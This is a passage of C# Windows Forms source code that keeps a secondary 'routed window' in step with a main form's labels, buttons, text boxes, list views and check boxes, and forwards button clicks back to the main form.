            if (disableWrite.Contains(name)) return; //If write is disabled on this control then return
            Form1.setvalue.Add(name + "§" + text); //Update the setvalue instructions
        }

        /// <summary>
        /// Selected Index Changed event handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void OnIndexChange(object sender, EventArgs e)
        {
            Console.WriteLine("index changed"); //Debug Function
            //if (Form1.protectLv) return;
            /*if (Form1.rwriteLv == 1)
            {
                Form1.rwriteLv = 0;
                Console.WriteLine("Disable rwirteLV");
                return;
            }*/
            //if (Form1.rwriteLv == 1) Form1.rwriteLv++;
            String name = ""; //Declare caller name
            Control ctl = sender as Control; //Cast the caller to a control
            name = ctl.Name; //Set the caller's name
            if (ctl.Name.StartsWith("listView")) //If the caller is a listView
            {
                ListView lv = ctl as ListView; //Cast the control to a listView
                int index = -1; //Declare the selected index
                if (lv.SelectedIndices.Count > 0) index = lv.SelectedIndices[0]; //Set the selected index
                if (index != -1) //If selected index is set
                {
                    Console.WriteLine("setIndex: " + index.ToString()); //Debug Function
                    Form1.setvalue.Add(name + "§" + index.ToString()); //Update the setvalue instructions
                }
            }
        }

        /// <summary>
        /// Click event handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void OnClick(object sender, EventArgs e)
        {
            try //Try
            {
                Control send = (Control)sender; //Cast the caller to a control
                int routeID = int.Parse(send.Parent.Text.Split('[')[1].Substring(0, 1)); //Get out route ID
                Form1.setFocusRouteID = routeID; //Set the focused route ID
                Control remoteObj = page.Controls.Find(send.Name, false)[0]; //Find the original button
                Button remoteButton = (Button)remoteObj; //Cast the control to a button
                TabPage backup = Form1.selected; //Get the seleczed tabPage
                Form1.setPagebackup = backup; //Store the selected tabPage
                Form1.setvalue.Add("tabControl1§" + page.Name.Replace("tabPage", "")); //Update the setvalue instructions
                Timer t = new Timer
                {
                    Interval = 200 //Set the frequency to 200 ms
                }; //Create a new timer
                t.Tick += new EventHandler(WaitForTabChange); //Set the tick event handler
                Form1.rbutton = remoteButton; //Store the remote button to click
                t.Start(); //Start the timer
            }
            catch (Exception ex) //Something went wrong or toolstrip item is clicked
            {
                Console.WriteLine("Routed Window button onclick error ERROR = " + ex.Message); //Debug Function
                //ToolStripItem
                ToolStripItem send = (ToolStripItem)sender; //Cast the caller to a tool strip item
                //MessageBox.Show(send.Name);
                Form1 parent = new Form1(); //Create a new Form1 object
                
                parent.ExecuteToolStrip(send.Name); //Execute the toolStrip
            }
        }

        /// <summary>
        /// Tick event handler to wait for the TabPage to change
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void WaitForTabChange(object sender, EventArgs e)
        {
            if (Form1.setFocusBack == 1) //If set focus back is in mode 1
            {
                if (Form1.selected == page) //If our tabPage is selected
                {
                    Form1.rbutton.PerformClick(); //Perform the click
                    Form1.rbutton = new Button(); //Remove the button reference from the variable
                    Form1.setvalue.Add("tabControl1§" + Form1.setPagebackup.Name.Replace("tabPage", "")); //Update set value intructions (select old tab page)
                    Form1.setFocusBack = 2; //Set focus back mode to 2
                    return; //Return
                }
            }

            if (Form1.setFocusBack == 2) //If focus mode is in 2
            {
                if (Form1.selected == Form1.setPagebackup) //If the original tabPage is selected
                {
                    int ID = Form1.setFocusRouteID; //Get the ID of the focused route
                    Form cRoute = Form1.routeWindow[ID - 1]; //Get the form of the route
                    cRoute.BringToFront(); //Bring that route form to the front
                    Timer me = (Timer)sender; //Cast the caller to a timer
                    Form1.setFocusBack = 1; //Set focus mode to 1
                    Form1.setFocusRouteID = -1; //Set focus route to -1
                    me.Stop(); //Stop the timer
                }
            }
        }

        /// <summary>
        /// Tick event handler to update the routed window
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void UpdateUI(object sender, EventArgs e)
        {
            Control.ControlCollection controls = currentRoute.Controls; //Get every control in the window

            foreach (Control c in controls) //Go through the controls
            {
                String name = c.Name; //Get the control's name
                String type = GetControlType(name); //Get the control's type
                if (type == "") continue; //If invalid type then skip the control
                if (GetignoreState(name)) continue; //if we ignore the element, then continue
                switch (type) //Switch the type
                {
                    case "label": //if control is a label

                        Label l = (Label)c; //Cast the control to a label
                        String lc = l.Text; //Get the text
                        String lv = Form1.GetValue(l.Name); //Get the text of the main form's label

                        if (lv != lc) //If the texts doesn't match
                        {
                            l.Text = lv; //Set our text to the main form's text
                        }

                        break; //Break the switch

                    case "button": //Control is a button

                        Button b = (Button)c; //Cast the control to a button
                        String bc = b.Text; //Get the button text
                        String bv = Form1.GetValue(b.Name); //Get the button's text on the main form

                        if (bv != bc) //If the texts doesn't match
                        {
                            b.Text = bv; //Set our text to the form's text
                        }

                        break; //break the switch

                    case "comboBox": //Control is a combobox

                        ComboBox cb = (ComboBox)c; //Cast the control to a combobox
                        String iname = cb.SelectedItem.ToString(); //Get the selected item
                        String vname = new Form1().GetSelectedItem(cb.Name); //Get the combobox's selected item on the main form
                        if (iname != vname && !cb.DroppedDown) //If the names doesn't match and combobox is not in dropdown mode
                        {
                            cb.SelectedItem = vname; //Set the selected items to the from's selected item
                        }

                        break; //Break the switch

                    case "richTextBox": //Control is a richTextBox

                        RichTextBox rtb = (RichTextBox)c; //Cast the control to a richTextBox
                        String rtbc = rtb.Text; //Get the text
                        String rtbv = Form1.GetValue(rtb.Name); //Get the text of the main form's richTextBox

                        if (rtbv != rtbc) //If the texts doesn't match
                        {
                            disableWrite.Add(rtb.Name); //Disable setvalue writing for the richTextBox (to block infinite loops of setting text)
                            rtb.Text = rtbv; //Set the text of the richTextBox
                        }

                        break; //Break the switch

                    case "textBox": //Control is a textBox

                        TextBox tb = (TextBox)c; //Cast the control to a textBox
                        String tbc = tb.Text; //Get the text
                        String tbv = Form1.GetValue(tb.Name); //Get the text of the form's textBox

                        if (tbv != tbc) //If the texts doesn't match
                        {
                            disableWrite.Add(tb.Name); //Disable setvalue writing for the textBox (to prevent infinite loop of text changing)
                            tb.Text = tbv; //Set the text of the main form's textBox
                        }

                        break; //Break the switch

                    case "listView": //Control is a listView

                        ListView liv = (ListView)c; //Cast the control to a listView
                        List<String> myItems = new List<String>(); //Create a list for out items

                        foreach (ListViewItem lvi in liv.Items) //For each item in our listView
                        {
                            String emt = ""; //Declare item string
                            int sindex = lvi.SubItems.Count; //Get the count of submitems
                            int count = 0; //Declare index variable
                            foreach (ListViewItem.ListViewSubItem si in lvi.SubItems) //Go through the subitems
                            {
                                if (si.Text == "") //If the text is empty
                                {
                                    count++; //Increment the count
                                    continue; //Skip this subitem
                                }

                                if (count < sindex) //If it's not the last subitem
                                {
                                    emt += si.Text + "|"; //Append to the item + separator char
                                }
                                else //It's the last element
                                {
                                    emt += si.Text; //Append to the item
                                }

                                //Console.WriteLine("GET Emt: " + emt);

                                count++; //Increment the index
                            }
                            myItems.Add(emt); //add the item to the items list
                        }

                        String[] ritems = new Form1().GetItems(liv.Name, "items"); //Get the items of the main form's listView
                        bool editItems = false; //Declare editItems flag

                        if (myItems.Count == ritems.Length) //If items count match
                        {
                            for (int i = 0; i < ritems.Length; i++) //Go throught the items
                            {
                                String validate1 = ritems[i]; //Text of main form's item
                                String validate2 = myItems[i]; //Text of our item

                                //Console.WriteLine("VALIDATE\n   Remote: " + validate1 + "\n     generated: " + validate2);

                                if (validate1 != validate2) //If the texts doesn't match
                                {
                                    Console.WriteLine("INVALID \n " + validate1 + "\n " + validate2); //Debug Function
                                    editItems = true; //Edit the items
                                    break; //Break the loop
                                }
                            }
                        }
                        else //Counts mismatch
                        {
                            editItems = true; //Edit the items
                        }

                        if (editItems) //if we need to edit the items
                        {
                            //MessageBox.Show("edit");
                            liv.Items.Clear(); //Clear our listView
                            foreach (String item in ritems) //Go through the items of the main form's listView
                            {
                                ListViewItem add = new ListViewItem(item.Split('|')[0]); //Create a new listView item
                                int track = 0; //Declare index variable
                                foreach (String sitem in item.Split('|')) //Loop through the subitems
                                {
                                    if (track == 0) //If it's the first item
                                    {
                                        track++; //Increment the index
                                        continue; //Skip the first item
                                    }

                                    add.SubItems.Add(sitem); //Add the subitem

                                    track++; //Increment the index
                                }
                                liv.Items.Add(add); //Add the items to the listView
                            }
                        }
                        
                        String selected = new Form1().GetItems(liv.Name, "selected")[0]; //Get the seleczed item on the main form's listView
                        if (selected != "-1" && !Form1.protectLv) //If an item is selected and the listView is not protected
                        {
                            //Form1.rwriteLv = 1;

                            if (liv.SelectedIndices.Count > 0) //If our listView has a selected item
                            {
                                if (liv.SelectedIndices[0] != int.Parse(selected)) //If the selected indexes mismatch
                                {
                                    liv.Items[liv.SelectedIndices[0]].Selected = false; //Deselect the current item
                                    liv.Items[int.Parse(selected)].Selected = true; //Select the item selected on the main form's listView
                                }
                            }
                            else //No selected items
                            {
                                liv.Items[int.Parse(selected)].Selected = true; //Select the item selected on the main form's listView
                            }
                        }


                        break; //break the loop

                    case "checkBox": //Control is a checkBox

                        CheckBox cx = (CheckBox)c; //Cast the control to a checkBox
                        bool xbc = cx.Checked; //Get the checked state
                        bool xbv = new Form1().GetChecked(cx.Name); //Get the main form's checkBox's checked state

                        if (xbv != xbc) //If the states mismatch
                        {
                            cx.Checked = xbv; //Set our state to the main form's checkBox's state
                        }

                        break; //break the switch
                }
            }

            disableWrite.Clear(); //Re enable the writing of setvalue instructions
        }

        /// <summary>
        /// Get the type of a control
        /// </summary>
        /// <param name="name">The name of the control to get the type of</param>
        /// <returns>The type of the control</returns>
        private String GetControlType(String name)
        {
            String type = ""; //Declare the type of the control

            for (int i = 0; i < name.Length; i++) //Loop through the name's characters
            {
                if (char.IsNumber(name, i)) //If the character is a number
                {
                    break; //Break the loop
                }
                type += name[i]; //Append the name's characters to the type
            }

            return type; //Return the type of the control
        }
    }

#endregion
}